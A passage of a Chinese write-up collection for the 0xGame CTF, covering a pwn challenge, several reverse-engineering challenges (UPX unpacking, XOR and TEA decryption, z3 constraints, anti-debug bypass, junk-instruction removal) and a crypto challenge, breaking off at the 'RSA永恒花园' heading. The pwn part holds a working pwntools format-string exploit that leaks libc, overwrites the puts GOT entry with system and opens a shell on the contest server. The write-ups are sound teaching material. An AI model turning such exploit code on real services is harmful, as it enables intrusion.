          0x403000           0x404000 r--p     1000    a000 pwn
          0x404000           0x405000 rw-p     1000    b000 pwn
    0x7ffff7c00000     0x7ffff7c28000 r--p    28000       0 libc.so.6 # 重点
    0x7ffff7c28000     0x7ffff7dbd000 r-xp   195000   28000 libc.so.6
    0x7ffff7dbd000     0x7ffff7e15000 r--p    58000  1bd000 libc.so.6
    0x7ffff7e15000     0x7ffff7e16000 ---p     1000  215000 libc.so.6
    0x7ffff7e16000     0x7ffff7e1a000 r--p     4000  215000 libc.so.6
    0x7ffff7e1a000     0x7ffff7e1c000 rw-p     2000  219000 libc.so.6
    0x7ffff7e1c000     0x7ffff7e29000 rw-p     d000       0 [anon_7ffff7e1c]
    0x7ffff7fb6000     0x7ffff7fbb000 rw-p     5000       0 [anon_7ffff7fb6]
    0x7ffff7fbb000     0x7ffff7fbf000 r--p     4000       0 [vvar]
    0x7ffff7fbf000     0x7ffff7fc1000 r--p     2000       0 [vvar_vclock]
    0x7ffff7fc1000     0x7ffff7fc3000 r-xp     2000       0 [vdso]
    0x7ffff7fc3000     0x7ffff7fc5000 r--p     2000       0 ../../debug/ld-linux-x86-64.so.2
    0x7ffff7fc5000     0x7ffff7fef000 r-xp    2a000    2000 ../../debug/ld-linux-x86-64.so.2
    0x7ffff7fef000     0x7ffff7ffa000 r--p     b000   2c000 ../../debug/ld-linux-x86-64.so.2
    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000   37000 ../../debug/ld-linux-x86-64.so.2
    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000   39000 ../../debug/ld-linux-x86-64.so.2
    0x7ffffffde000     0x7ffffffff000 rw-p    21000       0 [stack]
pwndbg> p/x 0x7ffff7c29e40 - 128 - 0x7ffff7c00000 # 重点
$1 = 0x29dc0 # 重点
pwndbg> fmtarg 0x7fffffffdcc8 # 重点
The index of format argument : 43 (\"\%42$p\") # 重点
```

**分析**

- 如上图所示，计算得出`libc_start_main_libc_addr - 128 = libc_base + 0x29dc0`
- `libc_start_main_libc_addr + 128`的地址在`%43$p`

```shell
C:\Users\probie>nc nc1.ctfplus.cn 48154
What's your name?
test
test
Good name!But do you know the magic of printf?
Tell me something you know about printf!
aaaa%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
aaaa0x7ffe07c326880x400x7f08001388620x280x7f08002550400xa74736574(nil)0x10x70257025616161610x70257025702570250x70257025702570250x70257025702570250x7f0a702570250x7ffe07d890000x101010000000x2
test

Oh,obviously you don't know the magic!
Good bye
```

**分析**

- `fmt_offset`为第`9`个地址

##### 编写脚本

```python
from pwn import *

context.os = "linux"
context.arch = "amd64"
# context.log_level = "debug"

# r = process("./pwn")
r = remote("nc1.ctfplus.cn", 48154)

# elf = ELF("./pwn")
# rop = ROP([elf])

# gdb.attach(r, """
# b *0x401077
# """)

payload = "/bin/sh;%43$p".encode()
r.sendlineafter("name?\n".encode(), payload)

r.recvuntil("0x".encode())

libc_start_main_libc_addr = int("0x" + r.recvline().decode().strip(), 16) - 128
libc_start_main_libc_offset = 0x29dc0
libc_base_addr = libc_start_main_libc_addr - libc_start_main_libc_offset

print("libc_start_main_libc_addr", hex(libc_start_main_libc_addr))
print("libc_base_addr", hex(libc_base_addr))

fmt_offset = 9

puts_got_elf_addr = 0x404018

system_libc_offset = 0x50d70
system_libc_addr = libc_base_addr + system_libc_offset

# one_gadget_libc_offset = [0xebc81, 0xebc85, 0xebc88, 0xebce2, 0xebd38, 0xebd3f, 0xebd43]
# one_gadget_libc_addr = [gadget_offset + libc_base_addr for gadget_offset in one_gadget_libc_offset]

payload = fmtstr_payload(fmt_offset, {puts_got_elf_addr : system_libc_addr}, write_size = "short")
r.sendafter("printf!\n".encode(), payload)

r.interactive()
r.close()
```

```shell
                                                                                        ba@@ls
flag
ld-linux-x86-64.so.2
libc.so.6
pwn
cat flag
0xGame{Kn0w_FMT_c4n_l3ak_m4ssag3}
```

---

#### 题目答案

##### 脚本

```python
脚本如上
```

##### Flag

```flag
0xGame{Kn0w_FMT_c4n_l3ak_m4ssag3}
```



## Reverse



### signin

#### 题目介绍

> 作者 Komorebi 
>
> 179 队已解出本题
>
> # signin
>
> - 241分
> - 无动态环境
> - Reverse
> - 入门
>
> 打开IDA来签个到吧ovo

---

#### 解题过程

##### 1. 打开IDA

```shell
IDA
```

##### 2. Shift+F12

```shell
.rdata:0000000000404060 build_note      db '0xGame{0pen_1DA_4nd_start_y0ur_reverse_Engineering!}',0
```

---

#### 题目答案

##### Flag

```flag
0xGame{0pen_1DA_4nd_start_y0ur_reverse_Engineering!}
```



### ez_upx

#### 题目介绍

> 作者 Komorebi 
>
> 117 队已解出本题
>
> # ez_upx
>
> - 315分
> - 无动态环境
> - Reverse
> - 简单
>
> 众所周知，**壳**是一个入门逆向手不得不品的一环。
>
> 加壳本质是 **“修改 PE/ELF 等可执行文件结构，在原始程序外包裹一层壳代码”**，壳代码优先执行，完成 “解压 / 解密 / 反调试” 后再移交控制权给原始程序。
>
> 按核心目的和技术强度，壳分为 **压缩壳** 和 **加密壳** 两大类。
>
> 相信你已经学会了，来试试吧！

---

#### 解题过程

##### 1. upx脱壳

```shell
upx -d attachment1.exe
```

```shell
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2025
UPX 5.0.2       Markus Oberhumer, Laszlo Molnar & John Reiser   Jul 20th 2025

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
     17408 <-     10752   61.76%    win64/pe     attachment1.exe

Unpacked 1 file.
```

##### 2. 可选手脱壳

我一开始`upx`忘记加`-d`了，所以干脆直接手脱壳

###### 2.1 WinHex

```shell
UPX0 UPX1 UPX2 UPX!
```

壳没有被魔改

###### 2.2 Snapshot-X64dbg

- `F9`跳到`UPX1`段
- 在右上角变红的`RSP`处转到内存
- 在右下角的`栈顶`处写入`4字节`的断点
- `F9`步过，看汇编处有`E9`样式的段
- 在`E9`处下断点，步到`E9`处
- `F8`单步进入`EOP`
- 用`Scylla`先`dump`后`IAT`后`Import`后删除`×`样式的段，最后`fix`一下程序

##### 3. IDA查看源码

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  FILE *v3; // rax
  FILE *v4; // rax
  char Buffer[136]; // [rsp+20h] [rbp-90h] BYREF
  size_t v7; // [rsp+A8h] [rbp-8h]

  sub_401A70(argc, argv, envp);
  SetConsoleOutputCP(0xFDE9u);
  j_printf("Input flag: ");
  v3 = (FILE *)off_404070();
  j_fflush(v3);
  v4 = (FILE *)off_404070();
  if ( j_fgets(Buffer, 128, v4) )
  {
    v7 = j_strcspn(Buffer, Control);
    Buffer[v7] = 0;
    if ( (unsigned int)sub_40184A(Buffer) )
      j_puts(aCorrectWelcome);
    else
      j_puts(aWrongFlagTryAg);
    j_puts(aPressEnterToEx);
    j__fgetchar();
    return 0;
  }
  else
  {
    j_puts(::Buffer);
    return 1;
  }
}
```

```c
_BOOL8 __fastcall sub_40184A(const char *a1)
{
  char Str1[48]; // [rsp+20h] [rbp-50h] BYREF
  _BYTE v3[32]; // [rsp+50h] [rbp-20h] BYREF

  if ( j_strlen(a1) != 29 )
    return 0;
  sub_401550(a1, v3, 29);
  return sub_4015C7(v3, 29, Str1) == 40 && j_strcmp(Str1, Str2) == 0;
}
```

```c
unsigned __int64 __fastcall sub_401550(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  unsigned __int64 result; // rax
  unsigned __int64 i; // [rsp+8h] [rbp-8h]

  for ( i = 0; ; ++i )
  {
    result = i;
    if ( i >= a3 )
      break;
    *(_BYTE *)(a2 + i) = aVivo50[i % 6] ^ *(_BYTE *)(a1 + i);
  }
  return result;
}
```

```assembly
UPX0:0000000000405000 aVivo50         db 'vivo50',0
```

```assembly
UPX0:0000000000405080 Str2            db 'RhExDlhVDSdGGEJHKRBGGmpbGFkBMGBgLkhXTkg=',0
```

**分析**

- 流密码
- 解密流程是先将`Str2`进行一次`decodeBase64`然后循环亦或`vivo50`

##### 4. 编写脚本

```python
import base64
key = b"vivo50"
ct = base64.b64decode("RhExDlhVDSdGGEJHKRBGGmpbGFkBMGBgLkhXTkg=")
flag = bytes(c ^ key[i % len(key)] for i, c in enumerate(ct))
print(flag.decode())
```

```shell
D:\Environment\python\python-3.13.0\python.exe D:\Work\study\python\main.py 
0xGame{N0www_y0u_kn0w_UPX!!!}
进程已结束，退出代码为 0
```

---

#### 题目答案

##### 脚本

```python
脚本如上
```

##### Flag

```flag
0xGame{N0www_y0u_kn0w_UPX!!!}
```



### 欸？云朵

#### 题目介绍

> 作者 Komorebi 
>
> 135 队已解出本题
>
> # 欸？云朵
>
> - 285分
> - 无动态环境
> - Reverse
> - 简单
>
> 欸😲？云朵☁️😄，哒↘哒↗哒↘哒↗哒↘，好想玩原神😨，云☁️原神😙，当当当当当😊，看精彩纷纷👍🎊😆，云☁️原神😄
>
> 咦？是不是有什么东西闪过去了？

---

#### 解题过程

##### 1. 查看源码

```c
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  struct tagMSG Msg; // [rsp+60h] [rbp-20h] BYREF
  WNDCLASSA WndClass; // [rsp+90h] [rbp+10h] BYREF
  HWND hWnd; // [rsp+D8h] [rbp+58h]

  memset(&WndClass, 0, sizeof(WndClass));
  WndClass.lpfnWndProc = (WNDPROC)sub_401871;
  WndClass.hInstance = hInstance;
  WndClass.hCursor = LoadCursorA(0, (LPCSTR)0x7F00);
  WndClass.hbrBackground = (HBRUSH)6;
  WndClass.lpszClassName = "CloudFlashWindow";
  if ( !RegisterClassA(&WndClass) )
    return 1;
  hWnd = CreateWindowExA(
           0,
           "CloudFlashWindow",
           "0xGame2026",
           0xCF0000u,
           0x80000000,
           0x80000000,
           520,
           180,
           0,
           0,
           hInstance,
           0);
  if ( !hWnd )
    return 1;
  ShowWindow(hWnd, nShowCmd);
  UpdateWindow(hWnd);
  Sleep(1u);
  DestroyWindow(hWnd);
  memset(&Msg, 0, sizeof(Msg));
  while ( GetMessageA(&Msg, 0, 0, 0) > 0 )
  {
    TranslateMessage(&Msg);
    DispatchMessageA(&Msg);
  }
  return 0;
}
```

**分析**

- 这里的`flag`一闪而过，我们只需要在某处下断点截取就可以了
- `ShowWindow(hWnd, nShowCmd);`这里应该是显示`flag`的地方
- 我们可以在`Sleep(1u);`这里下断点，延长等待时间

##### 2. 运行调试

```shell
0xGame{Dyn4m1c_1$_s0_Fun!}
```

---

#### 题目答案

##### Flag

```flag
0xGame{Dyn4m1c_1$_s0_Fun!}
```



### 旧时代的信号

#### 题目介绍

> 作者 Komorebi 
>
> 95 队已解出本题
>
> # 旧时代的信号
>
> - 366分
> - 无动态环境
> - Reverse
> - 简单
>
> 什么叫此应用无法运行啊！旮旯给木里不是这样的！
>
> ———似乎是来自旧时代的文件呢，想办法读懂它在干什么吧

---

#### 解题过程

##### 1. 查看汇编

```assembly
seg000:0000                 public start
seg000:0000 start           proc near
seg000:0000                 push    cs
seg000:0001                 pop     ds
seg000:0002                 assume ds:seg000
seg000:0002                 push    cs
seg000:0003                 pop     es
seg000:0004                 assume es:seg000
seg000:0004                 cld
seg000:0005                 mov     si, 5Dh ; ']' # 密文起始
seg000:0008                 mov     di, 7Eh ; '~' # 明文输出缓冲区
seg000:000B                 mov     cx, 21h ; '!' # 33字节
seg000:000E                 mov     bl, 0A7h
seg000:0010                 xor     bh, bh
seg000:0012
seg000:0012 loc_10012:                              ; CODE XREF: start+28↓j
seg000:0012                 lodsb # al = [ds:si], si++
seg000:0013                 ror     al, 1
seg000:0015                 ror     al, 1
seg000:0017                 ror     al, 1 # al 循环右移3位
seg000:0019                 sub     al, 7
seg000:001B                 sub     al, bh
seg000:001D                 xor     al, bl
seg000:001F                 stosb # [es:di]=al, di++
seg000:0020                 add     bl, al
seg000:0022                 rol     bl, 1
seg000:0024                 xor     bl, bh
seg000:0026                 inc     bh
seg000:0028                 loop    loc_10012
seg000:002A                 mov     al, 24h ; '$'
seg000:002C                 stosb # 在末尾追加 '$'，满足 DOS 09h号中断打印字符串要求
seg000:002D                 mov     dx, 47h ; 'G'
seg000:0030                 mov     ah, 9
seg000:0032                 int     21h             ; DOS - PRINT STRING
seg000:0032                                         ; DS:DX -> string terminated by "$"
seg000:0034                 mov     dx, 7Eh ; '~'
seg000:0037                 mov     ah, 9
seg000:0039                 int     21h             ; DOS - PRINT STRING
seg000:0039                                         ; DS:DX -> string terminated by "$"
seg000:003B                 mov     dx, 5Ah ; 'Z'
seg000:003E                 mov     ah, 9
seg000:0040                 int     21h             ; DOS - PRINT STRING
seg000:0040                                         ; DS:DX -> string terminated by "$"
seg000:0042                 mov     ax, 4C00h
seg000:0045                 int     21h             ; DOS - 2+ - QUIT WITH EXIT CODE (EXIT)
seg000:0045 start           endp                    ; AL = exit code
seg000:0045
seg000:0045 ; ---------------------------------------------------------------------------
seg000:0047                 db 53h, 69h, 67h, 6Eh, 61h, 6Ch, 20h, 72h, 65h, 63h, 6Fh
seg000:0052                 db 76h, 65h, 72h, 65h, 64h, 3Ah, 20h, 24h, 0Dh, 0Ah, 24h
seg000:005D                 db 0F4h, 0FEh, 88h, 0C2h, 0D2h, 54h, 64h, 6, 28h, 0D5h
seg000:0067                 db 0BDh, 0B6h, 65h, 58h, 4Dh, 1Dh, 56h, 7Eh, 0Bh, 99h
seg000:0071                 db 0E6h, 0F2h, 0A4h, 55h, 7Dh, 21h, 83h, 96h, 0E1h, 10h
seg000:007B                 db 0Dh, 4Fh, 5Ch, 22h dup(0)
seg000:00A0                 db 160h dup(?)
seg000:00A0 seg000          ends
seg000:00A0
seg000:00A0
seg000:00A0                 end start
```

##### 2. 编写脚本

```python
cipher = [
0xF4,0xFE,0x88,0xC2,0xD2,0x54,0x64,0x06,0x28,0xD5,
0xBD,0xB6,0x65,0x58,0x4D,0x1D,0x56,0x7E,0x0B,0x99,
0xE6,0xF2,0xA4,0x55,0x7D,0x21,0x83,0x96,0xE1,0x10,
0x0D,0x4F,0x5C
]

bl = 0xA7
bh = 0
plain = []
for b in cipher:
    al = b
    # ror al,3
    al = ((al >> 3) | (al << (8-3))) & 0xff
    al = (al - 7) & 0xff
    al = (al - bh) & 0xff
    al ^= bl
    plain.append(al)

    # 更新bl,bh
    bl = (bl + al) & 0xff
    # rol bl,1
    bl = ((bl << 1) | (bl >> 7)) & 0xff
    bl ^= bh
    bh += 1

print(bytes(plain).decode('ascii'))
```

```shell
D:\Environment\python\python-3.13.0\python.exe D:\Work\study\python\main.py 
0xGame{JuS7_g1v3_16bit7t_@_try!!}
进程已结束，退出代码为 0
```

##### 3. 解法二DOSBox运行

```shell
0xGame{JuS7_g1v3_16bit7t_@_try!!}
```

---

#### 题目答案

##### 脚本

```python
脚本如上
```

##### Flag

```flag
0xGame{JuS7_g1v3_16bit7t_@_try!!}
```



### Guess

#### 题目介绍

> 作者 Komorebi 
>
> 82 队已解出本题
>
> # Guess
>
> - 407分
> - 无动态环境
> - Reverse
> - 简单
>
> 我们来玩游戏吧！猜猜我选中了哪个数字，猜中了就告诉你flag好不好？
>
> ———嘻嘻，我骗你的

---

#### 解题过程

##### 1. exe2pyc

```shell
D:\Environment\pyinstxtractor\pyinstxtractor-2025.2\pyinstxtractor.py attachment.exe
```

```shell
game.pyc
```

##### 2. pyc2py

Python 3.14 目前没有现成的反编译器 （uncompyle6/decompyle3 只支持到 3.8/3.9，pydc 大约到 3.11）。所以实际可行的路线是 反汇编（dis）→ 人工重建源码 ，或者更稳的 直接执行 pyc 里的代码对象 。

```python
import marshal, struct, types

data = open(r'c:\Users\probie\Desktop\attachment5\attachment.exe_extracted\game.pyc', 'rb').read()
co = marshal.loads(data[16:])

ns = {'__builtins__': __builtins__}
for c in co.co_consts:
    if isinstance(c, types.CodeType) and c.co_name == 'tea_decrypt':
        tea_decrypt = types.FunctionType(c, ns, 'tea_decrypt')
exec(co, ns)

TEA_KEY = ns['TEA_KEY']
CT = ns['FLAG_CIPHERTEXT']
print('key =', TEA_KEY)
print('ct  =', CT.hex(), len(CT))

secret = tea_decrypt(CT, TEA_KEY)
print('secret =', secret)
```

```shell
key = b'guess_secret_key'
ct  = 1102c93630fe71bd39ad4e4cc34600299897001c3300581e465c56d2a11ba430819e7a59f1c20188f40ccba3a312dd3d 48
secret = b'0xGame{Congratulations_0n_y0ur_v1ct0ry\xef\xbc\x9a\xef\xbc\x89}'
```

**分析**

- `\xef\xbc\x9a\xef\xbc\x89` 是 UTF-8 的全角`：）`

```shell
0xGame{Congratulations_0n_y0ur_v1ct0ry：）}
```

---

#### 题目答案

##### 脚本

```python
脚本如上
```

##### Flag

```flag
0xGame{Congratulations_0n_y0ur_v1ct0ry：）}
```



### z3_solver

#### 题目介绍

> 作者 Komorebi 
>
> 98 队已解出本题
>
> # z3_solver
>
> - 358分
> - 无动态环境
> - Reverse
> - 简单
>
> z3-solver是由Microsoft Research(微软)开发的SMT求解器，它用于检查逻辑表达式的可满足性，可以找到一组约束中的其中一个可行解

---

#### 解题过程

##### 1. 查看源码

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  FILE *v3; // rax
  FILE *v4; // rax
  char Buffer[128]; // [rsp+20h] [rbp-80h] BYREF

  sub_401880(argc, argv, envp);
  puts("=== Constraint Gate ===");
  puts("Every character matters. Can you satisfy them all?");
  v3 = (FILE *)off_403070();
  fwrite("flag > ", 1u, 7u, v3);
  v4 = (FILE *)off_403070();
  if ( fgets(Buffer, 128, v4) )
  {
    Buffer[strcspn(Buffer, "\r\n")] = 0;
    if ( strlen(Buffer) == 23 )
    {
      if ( (unsigned int)sub_401550(Buffer) )
      {
        puts("Correct! Constraints solved.");
        return 0;
      }
      else
      {
        puts("Nope. At least one constraint is unhappy.");
        return 1;
      }
    }
    else
    {
      puts("Wrong length.");
      return 1;
    }
  }
  else
  {
    puts("Input error.");
    return 1;
  }
}
```

```c
__int64 __fastcall sub_401550(__int64 a1)
{
  int i; // [rsp+Ch] [rbp-4h]

  for ( i = 0; i <= 22; ++i )
  {
    if ( *(_BYTE *)(a1 + i) <= 0x1Fu || *(_BYTE *)(a1 + i) > 0x7Eu )
      return 0;
    if ( 5 * *(unsigned __int8 *)(a1 + (i + 1) % 23)
       + 3 * *(unsigned __int8 *)(a1 + i)
       + 11 * *(unsigned __int8 *)(a1 + (i + 7) % 23)
       + 7 * *(unsigned __int8 *)(a1 + (i + 4) % 23) != word_404000[i] )
      return 0;
  }
  return 1;
}
```

```assembly
.rdata:0000000000404000 word_404000     dw 0B21h, 7BFh, 0A2Ch, 0A2Bh, 8FCh, 860h, 0AC7h, 0A21h
.rdata:0000000000404000                                         ; DATA XREF: sub_401550+13F↑o
.rdata:0000000000404010                 dw 7EEh, 0A0Eh, 0B55h, 0A05h, 0ABBh, 902h, 0BC8h, 0BCBh
.rdata:0000000000404020                 dw 6FFh, 0C4Eh, 0A48h, 7E3h, 0AEFh, 0A27h, 0A57h
```

**分析**

- 题目提示用`z3`进行约束解这道线性方程

##### 编写脚本

```python
from z3 import *

w = [0xB21, 0x7BF, 0xA2C, 0xA2B, 0x8FC, 0x860, 0xAC7, 0xA21,
     0x7EE, 0xA0E, 0xB55, 0xA05, 0xABB, 0x902, 0xBC8, 0xBCB,
     0x6FF, 0xC4E, 0xA48, 0x7E3, 0xAEF, 0xA27, 0xA57]

s = Solver()
c = [Int(f'c{i}') for i in range(23)]

for i in range(23):
    s.add(c[i] >= 32, c[i] <= 126)

for i in range(23):
    eq = 3*c[i] + 5*c[(i+1)%23] + 7*c[(i+4)%23] + 11*c[(i+7)%23] == w[i]
    s.add(eq)

if s.check() == sat:
    m = s.model()
    res = ''.join([chr(m[c[i]].as_long()) for i in range(23)])
    print(res)
else:
    print("no solution")
```

```shell
D:\Environment\python\python-3.13.0\python.exe D:\Work\study\python\main.py 
0xGame{z3_Se3ms_ezzz2z}
进程已结束，退出代码为 0
```

---

#### 题目答案

##### 脚本

```python
脚本如上
```

##### Flag

```flag
0xGame{z3_Se3ms_ezzz2z}
```



### 欸？云朵のrevenge

#### 题目介绍

> 作者 Komorebi 
>
> 55 队已解出本题
>
> # 欸？云朵のrevenge
>
> - 525分
> - 无动态环境
> - Reverse
> - 简单
>
> 听说有人邪修抓住了云朵？某个红色的很烫的女孩子很生气，往里面加了点东西……

---

#### 解题过程

##### 1. 查看源码

```c
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  struct tagMSG Msg; // [rsp+60h] [rbp-20h] BYREF
  WNDCLASSA WndClass; // [rsp+90h] [rbp+10h] BYREF
  HWND hWnd; // [rsp+D8h] [rbp+58h]

  if ( (unsigned __int8)sub_4017DC() )
    return 0;
  memset(&WndClass, 0, sizeof(WndClass));
  WndClass.lpfnWndProc = (WNDPROC)sub_401B4B;
  WndClass.hInstance = hInstance;
  WndClass.hCursor = LoadCursorA(0, (LPCSTR)0x7F00);
  WndClass.hbrBackground = (HBRUSH)6;
  WndClass.lpszClassName = "CloudFlashWindow";
  if ( !RegisterClassA(&WndClass) )
    return 1;
  hWnd = CreateWindowExA(
           0,
           "CloudFlashWindow",
           "0xGame2026",
           0xCF0000u,
           0x80000000,
           0x80000000,
           520,
           180,
           0,
           0,
           hInstance,
           0);
  if ( !hWnd )
    return 1;
  ShowWindow(hWnd, nShowCmd);
  UpdateWindow(hWnd);
  Sleep(1u);
  DestroyWindow(hWnd);
  memset(&Msg, 0, sizeof(Msg));
  while ( GetMessageA(&Msg, 0, 0, 0) > 0 )
  {
    TranslateMessage(&Msg);
    DispatchMessageA(&Msg);
  }
  return 0;
}
```

```c
__int64 sub_4017DC()
{
  return sub_401793();
}
```

```c
bool sub_401793()
{
  HANDLE CurrentProcess; // rax
  BOOL pbDebuggerPresent; // [rsp+2Ch] [rbp-4h] BYREF

  pbDebuggerPresent = 0;
  CurrentProcess = GetCurrentProcess();
  return CheckRemoteDebuggerPresent(CurrentProcess, &pbDebuggerPresent) && pbDebuggerPresent;
}
```

**分析**

- 这一题比上一题`欸？云朵`多了一个`反调试`
- 我们只需要在`.text:0000000000401DBE call    sub_4017DC`处下断点然后将`rip`指针改到`.text:0000000000401DD1 loc_401DD1:`即可绕过反调试
- 绕过之后记得要在`汇编`界面按`F8`一行一行地步过，它应该是把真正销毁窗口的代码搬进了创建窗口那里，如果你在反汇编窗口步过会看不到窗口

---

#### 题目答案

##### Flag

```flag
0xGame{Dyn4m1c_Dyn4m1c_Dyn4m1c}
```



### ez_flower

#### 题目介绍

> 作者 Komorebi 
>
> 92 队已解出本题
>
> # ez_flower
>
> - 375分
> - Reverse
> - 无动态环境
> - 中等
>
> 開いたばかりの花が散るのを
>          当刚刚绽放的花朵纷纷散落
> 「今年も早いね」と
>          你喃喃说道「今年也好快啊
>
> ​                                                             ———*桜流し*

---

#### 解题过程

##### 1. 查看提示

`README_player.txt`

~~~shell
# 花指令入门

附件是一个 Windows x86 控制台程序。程序里有三处花指令，尝试恢复正常控制流并找到 flag 校验逻辑。

提示：三组垃圾字节分别是 `11 22 33`、`44 55 66`、`12 34 56`；提示字符串和加密目标不会直接出现在 `strings` 中。flag 加密是简单的凯撒密码，字母移动 7 位。

运行程序并输入 flag：

```text
Input flag: <your flag>
```
~~~

##### 2. IDA删指令

```shell
Options -> General -> Number of opcode bytes -> 16
```

```shell
Search -> 12 34 56 -> 90 90 90 (nop nop nop)
```

```shell
code所有标红的指令集
```



```shell
Search -> 44 55 66 -> undefine -> 90 90 90
```

```shell
再次code所有标红的指令集
```



```shell
Search -> 11 22 33 -> null
```

```shell
Search -> 11 22 -> undefile -> 11 22 33 -> 90 90 90
```

```
再次code所有标红的指令集
```



```shell
选中所有标红的指令集按P
```

##### 3. 查看源码

```c
int __cdecl sub_D21100(int argc, const char **argv, const char **envp)
{
  SetConsoleOutputCP(0xFDE9u);
  return sub_D21128();
}
```

```c
// positive sp value has been detected, the output may be wrong!
int __usercall sub_D21128@<eax>(int a1@<ebp>)
{
  FILE *v1; // eax
  FILE *v2; // eax

  sub_D21000(&unk_D2F1A0, 12);
  v1 = __acrt_iob_func(1u);
  fflush(v1);
  v2 = __acrt_iob_func(0);
  if ( fgets((char *)(a1 - 136), 128, v2) )
  {
    for ( *(_DWORD *)(a1 - 4) = 0;
          *(_BYTE *)(a1 + *(_DWORD *)(a1 - 4) - 136)
       && *(_BYTE *)(a1 + *(_DWORD *)(a1 - 4) - 136) != 13
       && *(_BYTE *)(a1 + *(_DWORD *)(a1 - 4) - 136) != 10;
          ++*(_DWORD *)(a1 - 4) )
    {
      ;
    }
    *(_BYTE *)(a1 + *(_DWORD *)(a1 - 4) - 136) = 0;
    if ( *(_DWORD *)(a1 - 4) != 47 )
      goto LABEL_14;
    for ( *(_DWORD *)(a1 - 8) = 0; *(_DWORD *)(a1 - 8) < 0x2Fu; ++*(_DWORD *)(a1 - 8) )
      *(_BYTE *)(a1 + *(_DWORD *)(a1 - 8) - 184) = byte_D2F170[*(_DWORD *)(a1 - 8)] ^ 0x80;
    sub_D21060(a1 - 136, a1 - 232, 47);
    if ( !memcmp((const void *)(a1 - 232), (const void *)(a1 - 184), 0x2Fu) )
    {
      sub_D21000(&unk_D2F1B8, 32);
      putchar(10);
      return 0;
    }
    else
    {
LABEL_14:
      sub_D21000("\r(54=z<6;=t", 11);
      putchar(10);
      return 0;
    }
  }
  else
  {
    sub_D21000(&unk_D2F1AC, 12);
    putchar(10);
    return 1;
  }
}
```

##### 4. 数据搜集

```assembly
.rdata:00D2F170 B0                                              byte_D2F170     db 0B0h                 ; DATA XREF: sub_D21128+D9↑r
.rdata:00D2F171 E5                                                              db 0E5h
.rdata:00D2F172 CE                                                              db 0CEh
.rdata:00D2F173 E8                                                              db 0E8h
.rdata:00D2F174 F4                                                              db 0F4h
.rdata:00D2F175 EC                                                              db 0ECh
.rdata:00D2F176 FB                                                              db 0FBh
.rdata:00D2F177 C4                                                              db 0C4h
.rdata:00D2F178 F6                                                              db 0F6h
.rdata:00D2F179 C4                                                              db 0C4h
.rdata:00D2F17A DF                                                              db 0DFh
.rdata:00D2F17B C1                                                              db 0C1h
.rdata:00D2F17C EF                                                              db 0EFh
.rdata:00D2F17D B3                                                              db 0B3h
.rdata:00D2F17E DF                                                              db 0DFh
.rdata:00D2F17F ED                                                              db 0EDh
.rdata:00D2F180 B1                                                              db 0B1h
.rdata:00D2F181 F6                                                              db 0F6h
.rdata:00D2F182 E4                                                              db 0E4h
.rdata:00D2F183 B3                                                              db 0B3h
.rdata:00D2F184 F9                                                              db 0F9h
.rdata:00D2F185 A4                                                              db 0A4h
.rdata:00D2F186 DF                                                              db 0DFh
.rdata:00D2F187 C0                                                              db 0C0h
.rdata:00D2F188 F9                                                              db 0F9h
.rdata:00D2F189 EC                                                              db 0ECh
.rdata:00D2F18A DF                                                              db 0DFh
.rdata:00D2F18B DA                                                              db 0DAh
.rdata:00D2F18C D6                                                              db 0D6h
.rdata:00D2F18D F6                                                              db 0F6h
.rdata:00D2F18E B0                                                              db 0B0h
.rdata:00D2F18F F6                                                              db 0F6h
.rdata:00D2F190 F6                                                              db 0F6h
.rdata:00D2F191 A0                                                              db 0A0h
.rdata:00D2F192 E9                                                              db 0E9h
.rdata:00D2F193 B3                                                              db 0B3h
.rdata:00D2F194 C0                                                              db 0C0h
.rdata:00D2F195 E2                                                              db 0E2h
.rdata:00D2F196 B7                                                              db 0B7h
.rdata:00D2F197 F0                                                              db 0F0h
.rdata:00D2F198 ED                                                              db 0EDh
.rdata:00D2F199 E2                                                              db 0E2h
.rdata:00D2F19A F3                                                              db 0F3h
.rdata:00D2F19B F3                                                              db 0F3h
.rdata:00D2F19C A1                                                              db 0A1h
.rdata:00D2F19D A1                                                              db 0A1h
.rdata:00D2F19E FD                                                              db 0FDh
```

##### 5. 编写脚本

```python
HEX = "B0E5CEE8F4ECFBC4F6C4DFC1EFB3DFEDB1F6E4B3F9A4DFC0F9ECDFDAD6F6B0F6F6A0E9B3C0E2B7F0EDE2F3F3A1A1FD"

data = bytes.fromhex(HEX)
flag = []
for c in (b ^ 0x80 for b in data):
    if 0x61 <= c <= 0x7A:   c = (c - 97 - 7) % 26 + 97   # a-z 凯撒-7
    elif 0x41 <= c <= 0x5A: c = (c - 65 - 7) % 26 + 65   # A-Z 凯撒-7
    flag.append(chr(c))
print("".join(flag))
```

```shell
0xGame{WoW_Th3_f1ow3r$_@re_SOo0oo b3@u7ifull!!}
```

---

#### 题目答案

##### 脚本

```python
脚本如上
```

##### Flag

```flag
0xGame{WoW_Th3_f1ow3r$_@re_SOo0oo b3@u7ifull!!}
```



## Crypto



### 天使大人

#### 题目介绍

> 作者 不得其名 
>
> 131 队已解出本题
>
> # 天使大人
>
> - 291分
> - Crypto
> - 动态环境
> - 入门
>
> 很努力了呢，稍微放松一点也是没有问题的，你就坐在沙发上，等着给你做你喜欢的鸡蛋料理
>
> 不过吃饭的时候要自己张嘴哦
>
> （使用sagemath跑附件代码得到的结果上传就能得到flag)

---

#### 解题过程

##### 1. 更改后缀

```shell
.py -> .sage
```

##### 2. 运行sage

```shell
sage crypto.sage
```

```shell
e834598ba8cf6695cc9299364fe4fa63b05a1b55f847ab5aecb6d5dc251e2b77
```

##### 3. 连接远程

```shell
nc nc1.ctfplus.cn 47823
```

```shell
result = e834598ba8cf6695cc9299364fe4fa63b05a1b55f847ab5aecb6d5dc251e2b77
0xGame{r34lly g00d st3p f0rw4ord}
```

---

#### 题目答案

##### Flag

```flag
0xGame{r34lly g00d st3p f0rw4ord}
```



### RSA永恒花园

#### 题目介绍

> 作者 不得其名 
>
> 42 队已解出本题
>
> # RSA永恒花园
>
> - 603分
> - Crypto
> - 无动态环境
> - 中等
>
> ## 
>
